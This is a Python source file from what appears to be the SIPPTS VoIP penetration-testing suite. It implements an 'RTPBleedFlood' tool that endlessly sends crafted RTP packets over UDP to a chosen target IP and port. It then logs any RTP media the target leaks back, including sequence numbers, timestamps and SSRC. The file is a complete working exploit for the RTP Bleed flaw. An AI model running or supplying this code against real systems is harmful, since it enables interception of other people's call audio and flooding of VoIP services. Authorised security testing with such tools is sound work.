#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.2'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

# based in rtpnatscan: https://github.com/kapejod/rtpnatscan

import socket
import fcntl
import os
import sys
from lib.color import Color
from lib.logos import Logo


class RTPBleedFlood:
    def __init__(self):
        self.ip = ''
        self.port = ''
        self.payload = '0'

        self.c = Color()

    def start(self):
        self.port = int(self.port)
        self.payload = int(self.payload)

        logo = Logo('rtpbleedflood')
        logo.print()

        print(self.c.BWHITE + '[!] Target IP: ' +
              self.c.YELLOW + '%s' % self.ip)
        print(self.c.BWHITE + '[!] Target port:' +
              self.c.YELLOW + ' %d' % self.port)
        print(self.c.BWHITE + '[!] Payload type: ' +
              self.c.YELLOW + '%d' % self.payload)
        print(self.c.WHITE)

        print(self.c.YELLOW + '[+] Sending RTP packets to %s:%d' %
              (self.ip, self.port) + self.c.WHITE)

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error:
            print(self.c.RED + 'Failed to create socket' + self.c.WHITE)
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        host = (str(self.ip), self.port)
        nloop = 0

        while True:
            try:
                nloop += 1
                cloop = hex(nloop)[2:]
                cloop = cloop.zfill(4)
                cpayload = '%s' % hex(0x80 | self.payload & 0x7F)[2:]
                # byte[0] = 0x80 => RTP version 2
                # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                # byte[2-3] = Sequence number
                message = ('80'+cpayload+cloop+'0000000000000000')
                byte_array = bytearray.fromhex(message)

                if nloop == 65535:
                    nloop = 1

                # Send data
                sock.sendto(byte_array, host)

                try:
                    (msg, addr) = sock.recvfrom(4096)
                    (ipaddr, rport) = addr
                    size = len(msg)

                    if size >= 12:
                        x = '%s%s' % (hex(msg[2])[2:], hex(msg[3])[2:])
                        seq = int('0x%s' % x, base=16)
                        x = '%s%s%s%s' % (hex(msg[4])[2:], hex(msg[5])[
                                          2:], hex(msg[6])[2:], hex(msg[7])[2:])
                        timestamp = int('0x%s' % x, base=16)
                        ssrc = '%s%s%s%s' % (hex(msg[8])[2:], hex(
                            msg[9])[2:], hex(msg[10])[2:], hex(msg[11])[2:])

                        print(self.c.WHITE + 'received %d bytes from target port %d Seq number %s' %
                              (size, rport, seq))
                except:
                    # No data available
                    continue
            except KeyboardInterrupt:
                print(self.c.YELLOW + 'You pressed Ctrl+C!')
                exit()
            except:
                pass
